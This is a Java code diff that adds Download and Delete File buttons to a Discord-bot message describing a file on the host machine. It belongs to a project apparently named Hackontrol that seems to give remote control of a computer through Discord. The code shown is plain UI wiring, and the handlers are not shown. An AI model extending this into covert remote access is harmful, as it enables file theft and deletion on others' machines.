@@ -4,12 +4,15 @@ import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.attribute.BasicFileAttributeView;
 import java.nio.file.attribute.BasicFileAttributes;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Locale;
 import java.util.function.Consumer;
 import java.util.function.Supplier;
 
 import javax.swing.filechooser.FileSystemView;
 
+import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.utils.FileUtils;
 import com.khopan.hackontrol.utils.FileUtils.FileCountAndSize;
@@ -18,6 +21,7 @@ import com.khopan.hackontrol.utils.ImageUtils;
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.interactions.InteractionHook;
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
+import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.utils.FileUpload;
 import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
@@ -26,17 +30,22 @@ import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 public class FileEmbedSender implements Runnable {
 	private final File root;
 	private final Consumer<MessageCreateData> action;
+	private final Consumer<ButtonContext> downloadHandler;
+	private final Consumer<ButtonContext> deleteHandler;
 
-	private FileEmbedSender(File root, Consumer<MessageCreateData> action) {
+	private FileEmbedSender(File root, Consumer<MessageCreateData> action, Consumer<ButtonContext> downloadHandler, Consumer<ButtonContext> deleteHandler) {
 		this.root = root;
 		this.action = action;
+		this.downloadHandler = downloadHandler;
+		this.deleteHandler = deleteHandler;
 	}
 
 	@Override
 	public void run() {
 		EmbedBuilder embedBuilder = new EmbedBuilder();
 		embedBuilder.setTitle(this.root.getName());
-		embedBuilder.setColor(this.root.exists() ? 0xFF57F287 : 0xFFED4245);
+		boolean exist = this.root.exists();
+		embedBuilder.setColor(exist ? 0xFF57F287 : 0xFFED4245);
 		FileUpload upload = this.uploadIcon();
 
 		if(upload != null) {
@@ -54,7 +63,15 @@ public class FileEmbedSender implements Runnable {
 			messageBuilder.addFiles(upload);
 		}
 
-		messageBuilder.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete"));
+		List<ItemComponent> buttonList = new ArrayList<>();
+
+		if(exist && this.root.isFile()) {
+			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Download", this.downloadHandler :: accept));
+			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete File", this.deleteHandler :: accept));
+		}
+
+		buttonList.add(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete"));
+		messageBuilder.addActionRow(buttonList);
 		this.action.accept(messageBuilder.build());
 	}
 
@@ -116,7 +133,7 @@ public class FileEmbedSender implements Runnable {
 		}
 	}
 
-	public static void start(File root, Consumer<MessageCreateData> action) {
+	public static void start(File root, Consumer<MessageCreateData> action, Consumer<ButtonContext> downloadHandler, Consumer<ButtonContext> deleteHandler) {
 		if(root == null) {
 			throw new NullPointerException("Root cannot be null");
 		}
@@ -125,12 +142,12 @@ public class FileEmbedSender implements Runnable {
 			throw new NullPointerException("Action cannot be null");
 		}
 
-		Thread thread = new Thread(new FileEmbedSender(root, action));
+		Thread thread = new Thread(new FileEmbedSender(root, action, downloadHandler, deleteHandler));
 		thread.setName("Hackontrol File Query Thread");
 		thread.start();
 	}
 
-	public static void reply(File root, IReplyCallback callback) {
+	public static void reply(File root, IReplyCallback callback, Consumer<ButtonContext> onDownload, Consumer<ButtonContext> onDelete) {
 		new Object() {
 			private volatile MessageCreateData message;
 			private volatile InteractionHook hook;
@@ -139,7 +156,7 @@ public class FileEmbedSender implements Runnable {
 			private boolean defer;
 
 			{
-				FileEmbedSender.start(root, this :: callback);
+				FileEmbedSender.start(root, this :: callback, onDownload, onDelete);
 
 				try {
 					Thread.sleep(1500);
